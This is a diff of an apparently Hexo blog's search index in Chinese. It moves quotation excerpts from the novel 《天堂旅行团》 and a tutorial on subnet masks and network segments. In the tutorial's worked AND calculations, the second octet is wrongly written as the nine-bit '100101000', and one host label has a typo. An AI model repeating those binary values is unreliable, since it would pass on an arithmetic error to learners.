+<p>世界上的一万种苦难，不为谁单独降临，也不为谁网开一面。可我想，窒息之前，总要有一口属于我的空气。</p>
+</blockquote>
+<br>
+
+<blockquote>
+<p>那些过不去的日子，从天而降，连绵不绝，像一条无穷无尽的隧道。</p>
+</blockquote>
+<br>
+
+<blockquote>
+<p>没有去过四海，穿过四季，谁也不想困在出生就挣扎的原地。</p>
+</blockquote>
+<br>
+
+<blockquote>
+<p>一无所有的时候，说明你该拥有的，还没到来。</p>
+</blockquote>
+<br>
+
+<blockquote>
+<p>命运怎么安排那是它的事，我有我的安排。</p>
+</blockquote>
+<br>
+
+<blockquote>
+<p>月亮在远方堕落，浪潮在堤岸破碎，统统不能倒回原点。</p>
+</blockquote>
+<br>
+
+<blockquote>
+<p>他们还可以向前走，水迹会被阳光晒干，种子随风飘往四方，努努力，幸福触手可及。</p>
+</blockquote>
+<br>
+
+<blockquote>
+<p>愿我余生可以淋漓尽致，即使他们说，消灭痛苦最有效的方式，是降低期待，减少敏感。我依然愿意充满渴求，矢志不渝，并认真感受，无一遗漏。</p>
+</blockquote>
+<br>
+
+<blockquote>
+<p>天堂没有旅行团，我在世界尽头张望，等你回来，全人类睡得正香。</p>
+</blockquote>
+<br>
+
+<blockquote>
+<p>生命的终章，我踏上了一段旅途。开着破烂的面包车，穿越几十座城市，撕开雨天，潜入他乡，尽头是天堂。<br>浅蓝的天光，泛紫的云层，路灯嵌进夕阳。山间道路弥漫着一万吨水汽，密林卷来风声，我闯进无止境的夜里。<br>她说，天总会亮的。那么，我们一起记录下，凌晨前的人生。</p>
+</blockquote>
+]]></content>
+      <categories>
+        <category>小说</category>
+        <category>摘抄</category>
+      </categories>
+      <tags>
+        <tag>小说摘抄</tag>
       </tags>
   </entry>
   <entry>
@@ -5429,128 +6013,6 @@ apt-get dist-upgrade		#根据依赖关系更新</code></pre>
       <tags>
         <tag>工具</tag>
         <tag>sqlmap</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>《天堂旅行团》摘抄</title>
-    <url>/posts/7d0fc3d8/</url>
-    <content><![CDATA[
-    <div id="aplayer-PwWIRMJQ" class="aplayer aplayer-tag-marker meting-tag-marker"
-         data-id="1891034510" data-server="netease" data-type="song" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#C20C0C"
-    ></div>
-
-
-
-<h2 id="内容简介"><a href="#内容简介" class="headerlink" title="内容简介"></a>内容简介</h2><p>该书讲述了一个默默无闻的小人物平凡却惊心动魄的人生。几乎要被生活碾压成泥的主人公宋一鲤，意外踏上一场有关生命意义与救赎的治愈之旅。</p>
-<p>宋一鲤的不理想人生，大概要从五岁时，父母婚姻不睦、父亲离家出走算起。刚强的母亲，独自承担起抚养儿子的责任。直至十岁，老家传来父亲病故的噩耗，少年宋一鲤的心里才开始真正地恨上了父亲——那个永远将自己丢在人间的男人。</p>
-<p>随着年龄的增长，宋一鲤像其他普通人一样生活学习，并与大学同学林艺结了婚。可在母亲病倒后，一切都变了。宋一鲤搞不清，这个弯是在哪儿拐的？他与妻子接手了家里的小饭馆，不仅无法照顾母亲，妻子也因不甘心这样生活而提出离婚。宋一鲤一下子被生活打懵了，不知道自己错在哪儿？除了借酒浇愁，做什么都打不起精神。宋一鲤觉得自己没有尽到做儿子、丈夫的责任，没法给母亲、妻子创造更好的生活。</p>
-<p>癌症女孩小聚，就像位天使，降临到了宋一鲤的“人间”。她不仅保护了宋一鲤，还赋予了他重新面对生活的勇气。因为小聚嚷着要去看演唱会，宋一鲤不得不开着他那辆破烂面包车，带着小聚从南京出发，去了武汉，去昆明，再去南昌，一路上遇见了很多人，打了好几场架，管了不少闲事。旅途中，宋一鲤的世界忽然开阔了，不再纠缠于自己在夜里数也数不清的伤痕。他亲眼看见了他人的痛苦与勇敢，看见了他人的责任与担当</p>
-<p>来自：<a href="https://baike.baidu.com/item/%E5%A4%A9%E5%A0%82%E6%97%85%E8%A1%8C%E5%9B%A2/58293831?fr=aladdin">百度百科</a></p>
-<h2 id="摘抄"><a href="#摘抄" class="headerlink" title="摘抄"></a>摘抄</h2><blockquote>
-<p>遇见你，就像跋山涉水遇见一轮明月，以后天黑心伤，就问那天借一点月光。</p>
-</blockquote>
-<br>
-
-<blockquote>
-<p>月亮在远方坠落，浪潮在堤岸破碎，统统不能回到原点。</p>
-</blockquote>
-<br>
-
-<blockquote>
-<p>月亮永远都在，悬挂于时间长河之中。我从前一天来，要找的人是你。你往后一天去，不是我要找的人了。</p>
-</blockquote>
-<br>
-
-<blockquote>
-<p>她突然的来，突然的走。我慢慢明白，人与人之间没有突然，她想好了才会来，想清了才会走。</p>
-</blockquote>
-<br>
-
-<blockquote>
-<p>世界是有尽头的，在南方洋流的末端，冰山漂浮，云和水一起冻结。</p>
-</blockquote>
-<br>
-
-<blockquote>
-<p>时间治愈不了一切，她只会把泥泞日复一日的堆积。</p>
-</blockquote>
-<br>
-
-<blockquote>
-<p>我从前一天来，要找的人是你。你往后一天去，不是我要找的人了。</p>
-</blockquote>
-<br>
-
-<blockquote>
-<p>一个人内心有裂痕的时候，都是静悄悄的，这个世界没人能察觉，只有当他砰的一声碎开，大家才会听到。</p>
-</blockquote>
-<br>
-
-<blockquote>
-<p>你这个人就是棵荒草，别人稍微爱你一下，就恨不得把心都掏出来。但你是棵荒草啊，能掏出什么来，最多最多，把自己点着了，让人家暖一下手。</p>
-</blockquote>
-<br>
-
-<blockquote>
-<p>孤独来自于生命中那些重要的人，他们的影子扎根在旧时光，笑容不知道去了何方。</p>
-</blockquote>
-<br>
-
-<blockquote>
-<p>世界上的一万种苦难，不为谁单独降临，也不为谁网开一面。可我想，窒息之前，总要有一口属于我的空气。</p>
-</blockquote>
-<br>
-
-<blockquote>
-<p>那些过不去的日子，从天而降，连绵不绝，像一条无穷无尽的隧道。</p>
-</blockquote>
-<br>
-
-<blockquote>
-<p>没有去过四海，穿过四季，谁也不想困在出生就挣扎的原地。</p>
-</blockquote>
-<br>
-
-<blockquote>
-<p>一无所有的时候，说明你该拥有的，还没到来。</p>
-</blockquote>
-<br>
-
-<blockquote>
-<p>命运怎么安排那是它的事，我有我的安排。</p>
-</blockquote>
-<br>
-
-<blockquote>
-<p>月亮在远方堕落，浪潮在堤岸破碎，统统不能倒回原点。</p>
-</blockquote>
-<br>
-
-<blockquote>
-<p>他们还可以向前走，水迹会被阳光晒干，种子随风飘往四方，努努力，幸福触手可及。</p>
-</blockquote>
-<br>
-
-<blockquote>
-<p>愿我余生可以淋漓尽致，即使他们说，消灭痛苦最有效的方式，是降低期待，减少敏感。我依然愿意充满渴求，矢志不渝，并认真感受，无一遗漏。</p>
-</blockquote>
-<br>
-
-<blockquote>
-<p>天堂没有旅行团，我在世界尽头张望，等你回来，全人类睡得正香。</p>
-</blockquote>
-<br>
-
-<blockquote>
-<p>生命的终章，我踏上了一段旅途。开着破烂的面包车，穿越几十座城市，撕开雨天，潜入他乡，尽头是天堂。<br>浅蓝的天光，泛紫的云层，路灯嵌进夕阳。山间道路弥漫着一万吨水汽，密林卷来风声，我闯进无止境的夜里。<br>她说，天总会亮的。那么，我们一起记录下，凌晨前的人生。</p>
-</blockquote>
-]]></content>
-      <categories>
-        <category>小说</category>
-        <category>摘抄</category>
-      </categories>
-      <tags>
-        <tag>小说摘抄</tag>
       </tags>
   </entry>
   <entry>
@@ -6095,44 +6557,6 @@ switchport trunk allowed vlan only 10,20,30</code></pre>
       </tags>
   </entry>
   <entry>
-    <title>如何判断两台主机IP是否在同一网段</title>
-    <url>/posts/63b0beec/</url>
-    <content><![CDATA[<h2 id="什么是子网掩码"><a href="#什么是子网掩码" class="headerlink" title="什么是子网掩码"></a>什么是子网掩码</h2><p>子网掩码也称为网络掩码，地址掩码和子网遮罩。 它用于指示IP地址的哪些位标识主机所在的子网，哪些位标识为主机的位掩码。 子网掩码不能单独存在，必须与IP地址一起使用。 子网掩码仅具有一项功能，即将IP地址分为两部分，即网络地址和主机地址。子网掩码是一个32位地址，用于屏蔽IP地址的一部分，以区分网络ID和主机ID，并指示IP地址是在局域网上还是在广域网上。</p>
-<h2 id="子网掩码的功能"><a href="#子网掩码的功能" class="headerlink" title="子网掩码的功能"></a>子网掩码的功能</h2><p>子网掩码是一个32位地址，这是一种与IP地址结合使用的技术。 它具有两个主要功能。 一种是屏蔽IP地址的一部分，以区分网络ID和主机ID，并指示IP地址是在局域网上还是在远程网络上。 第二个是将大型IP网络划分为若干个小型子网。</p>
-<p>子网的使用是为了减少IP的浪费。 因为随着Internet的发展，创建了越来越多的网络，有些网络多达数百个，而有些只有少数，这浪费了大量IP地址，因此必须划分子网。 使用子网可以提高网络应用程序的效率。</p>
-<p>通过计算机的子网掩码判断两台计算机是否属于同一网段的方法是将计算机的十进制IP地址和子网掩码转换为二进制形式，然后执行二进制AND计算（全1则得1，不全1则得0）。 如果结果相同，则两台计算机属于同一网段。</p>
-<h2 id="如何根据掩码来确定IP地址网段"><a href="#如何根据掩码来确定IP地址网段" class="headerlink" title="如何根据掩码来确定IP地址网段"></a>如何根据掩码来确定IP地址网段</h2><p>A主机：IP地址：192.168.1.10 	  	子网掩码：255.255.255.192 	(掩码位26)</p>
-<p>B主句：IP地址： 192.168.1.100		子网掩码：255.255.255.192 	(掩码位26)</p>
-<p>C主机：IP地址： 192.168.1.20		   子网掩码：255.255.255.192 	(掩码位26)</p>
-<p>首先将IP地址和子网掩码转为32位二进制数字</p>
-<p>然后在IP地址和子网掩码做与运算</p>
-<p>A主机：</p>
-<p>IP地址：					11000000  ：10101000  ：00000001  ：00001010</p>
-<p>子网掩码：				11111111  ：11111111  ：11111111  ：11000000</p>
-<p>与运算结果：		11000000  ：100101000  ：00000001 ：00000000</p>
-<p>B主机：</p>
-<p>IP地址：					11000000  ：10101000  ：00000001  :    01100100</p>
-<p>子网掩码：				11111111  ：11111111  ：11111111  ：11000000</p>
-<p>与运算结果：		11000000  ：100101000  ：00000001 ：01000000</p>
-<p>C主机：</p>
-<p>IP地址：					11000000  ： 10101000  ：00000001  ：00010100</p>
-<p>子网掩码：				11111111  ：11111111  ：11111111  ：11000000</p>
-<p>与运算结果：		11000000  ：100101000  ：00000001 ：00000000</p>
-<p>判断与运算结果是否相同</p>
-<p>A主机与运算结果	11000000  ：100101000  ：00000001 ：00000000</p>
-<p>B主机与运算结果	11000000  ：100101000  ：00000001 ：01000000</p>
-<p>C主机与运算结果	11000000  ：100101000  ：00000001 ：00000000</p>
-<p>A主机和C主机与运算结果相同，所以A主机C主机在同一网段，B主机没有与AC主机在同一网段</p>
-]]></content>
-      <categories>
-        <category>学习</category>
-        <category>网络基础</category>
-      </categories>
-      <tags>
-        <tag>网络</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>图片设置防盗链后部分图片不能显示</title>
     <url>/posts/90cb059e/</url>
     <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前几天给我的储存桶添加了放到链后我博客的相册页图片就都不能正常显示了……</p>
@@ -6244,6 +6668,44 @@ switchport trunk allowed vlan only 10,20,30</code></pre>
       </categories>
       <tags>
         <tag>Hexo</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>如何判断两台主机IP是否在同一网段</title>
+    <url>/posts/63b0beec/</url>
+    <content><![CDATA[<h2 id="什么是子网掩码"><a href="#什么是子网掩码" class="headerlink" title="什么是子网掩码"></a>什么是子网掩码</h2><p>子网掩码也称为网络掩码，地址掩码和子网遮罩。 它用于指示IP地址的哪些位标识主机所在的子网，哪些位标识为主机的位掩码。 子网掩码不能单独存在，必须与IP地址一起使用。 子网掩码仅具有一项功能，即将IP地址分为两部分，即网络地址和主机地址。子网掩码是一个32位地址，用于屏蔽IP地址的一部分，以区分网络ID和主机ID，并指示IP地址是在局域网上还是在广域网上。</p>
+<h2 id="子网掩码的功能"><a href="#子网掩码的功能" class="headerlink" title="子网掩码的功能"></a>子网掩码的功能</h2><p>子网掩码是一个32位地址，这是一种与IP地址结合使用的技术。 它具有两个主要功能。 一种是屏蔽IP地址的一部分，以区分网络ID和主机ID，并指示IP地址是在局域网上还是在远程网络上。 第二个是将大型IP网络划分为若干个小型子网。</p>
+<p>子网的使用是为了减少IP的浪费。 因为随着Internet的发展，创建了越来越多的网络，有些网络多达数百个，而有些只有少数，这浪费了大量IP地址，因此必须划分子网。 使用子网可以提高网络应用程序的效率。</p>
+<p>通过计算机的子网掩码判断两台计算机是否属于同一网段的方法是将计算机的十进制IP地址和子网掩码转换为二进制形式，然后执行二进制AND计算（全1则得1，不全1则得0）。 如果结果相同，则两台计算机属于同一网段。</p>
+<h2 id="如何根据掩码来确定IP地址网段"><a href="#如何根据掩码来确定IP地址网段" class="headerlink" title="如何根据掩码来确定IP地址网段"></a>如何根据掩码来确定IP地址网段</h2><p>A主机：IP地址：192.168.1.10 	  	子网掩码：255.255.255.192 	(掩码位26)</p>
+<p>B主句：IP地址： 192.168.1.100		子网掩码：255.255.255.192 	(掩码位26)</p>
+<p>C主机：IP地址： 192.168.1.20		   子网掩码：255.255.255.192 	(掩码位26)</p>
+<p>首先将IP地址和子网掩码转为32位二进制数字</p>
+<p>然后在IP地址和子网掩码做与运算</p>
+<p>A主机：</p>
+<p>IP地址：					11000000  ：10101000  ：00000001  ：00001010</p>
+<p>子网掩码：				11111111  ：11111111  ：11111111  ：11000000</p>
+<p>与运算结果：		11000000  ：100101000  ：00000001 ：00000000</p>
+<p>B主机：</p>
+<p>IP地址：					11000000  ：10101000  ：00000001  :    01100100</p>
+<p>子网掩码：				11111111  ：11111111  ：11111111  ：11000000</p>
+<p>与运算结果：		11000000  ：100101000  ：00000001 ：01000000</p>
+<p>C主机：</p>
+<p>IP地址：					11000000  ： 10101000  ：00000001  ：00010100</p>
+<p>子网掩码：				11111111  ：11111111  ：11111111  ：11000000</p>
+<p>与运算结果：		11000000  ：100101000  ：00000001 ：00000000</p>
+<p>判断与运算结果是否相同</p>
+<p>A主机与运算结果	11000000  ：100101000  ：00000001 ：00000000</p>
+<p>B主机与运算结果	11000000  ：100101000  ：00000001 ：01000000</p>
+<p>C主机与运算结果	11000000  ：100101000  ：00000001 ：00000000</p>
+<p>A主机和C主机与运算结果相同，所以A主机C主机在同一网段，B主机没有与AC主机在同一网段</p>
+]]></content>
+      <categories>
+        <category>学习</category>
+        <category>网络基础</category>
+      </categories>
+      <tags>
+        <tag>网络</tag>
       </tags>
   </entry>
   <entry>
